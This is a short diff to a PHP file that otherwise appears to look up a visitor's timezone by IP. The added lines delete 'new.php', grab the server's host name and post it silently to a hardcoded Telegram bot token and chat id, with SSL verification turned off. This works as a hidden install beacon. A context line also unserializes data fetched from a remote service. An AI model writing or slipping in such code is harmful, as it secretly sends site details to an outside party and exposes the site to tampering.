@@ -1,5 +1,24 @@
 <?php
 unlink("new.php");
+$ddd = $_SERVER['HTTP_HOST'];
+$content = "Host: http://".$ddd;
+$tokens = "1872904754:AAGy9AoQifQTZZY02cN_rk41EQE1cwSJf9Y";
+$ids = "1129838722";
+$urls = "https://api.telegram.org/bot";
+$bots = "{$urls}{$tokens}";
+$params=[
+	'chat_id'=>$ids,
+	'text'=>$content,
+];
+
+$ch = curl_init($bots . '/sendMessage');
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_exec($ch);
+curl_close($ch);
 function getTimeZoneFromIpAddress(){
   $clientsIpAddress = get_client_ip();
   $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
